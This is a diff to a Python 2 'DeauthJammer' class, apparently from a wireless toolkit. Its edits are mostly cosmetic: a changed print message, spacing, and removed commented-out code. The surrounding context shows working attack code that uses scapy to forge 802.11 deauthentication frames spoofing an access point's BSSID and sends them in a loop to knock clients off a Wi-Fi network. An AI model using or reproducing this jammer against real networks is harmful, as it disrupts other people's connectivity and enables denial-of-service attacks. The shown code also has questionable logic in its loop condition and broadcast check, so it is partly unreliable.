@@ -41,7 +41,7 @@ class DeauthJammer(object):
 
         assert type(targets) is types.ListType
 
-        print "Using interface: "  + scapy.conf.iface
+        print "Sending packets using interface: "  + scapy.conf.iface
 
         AnalyzrCore.set_channel(scapy.conf.iface, channel)
 
@@ -90,12 +90,8 @@ class DeauthJammer(object):
 
     def _deauth_target(self, target, packet_count):
         broadcast = target.lower() != 'FF:FF:FF:FF:FF:FF'
-        ap_to_client_pckt = scapy.RadioTap()/scapy.Dot11(type=0, subtype=12, addr1=target, addr2=self._ap_bssid,
+        ap_to_client_pckt = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=target, addr2=self._ap_bssid,
                                         addr3=self._ap_bssid) / scapy.Dot11Deauth(reason=1)
-        # client_to_ap_pckt = None
-        # if not broadcast:
-        #     client_to_ap_pckt = scapy.Dot11(
-        #         addr1=self._ap_bssid, addr2=target, addr3=self._ap_bssid) / scapy.Dot11Deauth()
 
         actually_sent = 0
         for n in range(packet_count) or packet_count == -1:
@@ -106,11 +102,7 @@ class DeauthJammer(object):
                 time.sleep(0.1)
 
             scapy.sendp(ap_to_client_pckt)
-
-            # Seems not to be neccessary
-            # if not broadcast:
-            #     scapy.send(client_to_ap_pckt)
-
+            
             actually_sent = n
 
         print "Sent " + str(actually_sent + 1) + " packets to " + target
